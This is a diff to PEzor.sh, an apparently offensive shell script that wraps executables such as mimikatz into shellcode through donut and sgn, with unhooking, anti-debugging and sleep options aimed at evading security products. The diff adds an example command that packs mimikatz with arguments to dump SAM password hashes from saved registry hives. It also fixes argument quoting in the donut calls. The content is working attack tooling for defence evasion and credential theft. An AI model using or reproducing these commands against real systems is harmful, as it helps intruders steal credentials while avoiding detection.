@@ -62,6 +62,8 @@ EXAMPLES
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
   # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
   $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
+  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread) and arguments for donut
+  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2 "-plsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv"
 
 # PEzor <-32|-64> [options...] <SHELLCODE>
 
@@ -198,7 +200,8 @@ echo "unsigned int sleep_time = $SLEEP;" > $TMP_DIR/sleep.cpp
 
 if [ $IS_SHELLCODE = false ] && [ $SGN = false ]; then
     echo '[?] Executing donut' &&
-    (donut $BLOB -f 3 -o $TMP_DIR/shellcode.cpp.donut $@ || exit 1) &&
+    #(donut $BLOB -f 3 -o $TMP_DIR/shellcode.cpp.donut $@ || exit 1) &&
+    (donut $BLOB -f 3 -o $TMP_DIR/shellcode.cpp.donut "$@" || exit 1) &&
     echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
     if [ $TEXT = true ]; then echo '__attribute__((section (".text")))' >> $TMP_DIR/shellcode.cpp; fi &&
     cat $TMP_DIR/shellcode.cpp.donut >> $TMP_DIR/shellcode.cpp &&
@@ -221,7 +224,7 @@ elif [ $IS_SHELLCODE = true ] && [ $SGN = true ]; then
     echo 'unsigned int buf_size = sizeof(buf);' >> $TMP_DIR/shellcode.cpp || exit 1
 elif [ $IS_SHELLCODE = false ] && [ $SGN = true ]; then
     echo '[?] Executing donut' &&
-    (donut $BLOB -o $TMP_DIR/shellcode.bin.donut $@ || exit 1) &&
+    (donut $BLOB -o $TMP_DIR/shellcode.bin.donut "$@" || exit 1) &&
     echo '[?] Executing sgn' &&
     (sgn -a $BITS -c 1 -o $TMP_DIR/shellcode.bin $TMP_DIR/shellcode.bin.donut || exit 1) &&
     echo '#pragma clang diagnostic ignored "-Woverlength-strings"' >> $TMP_DIR/shellcode.cpp &&
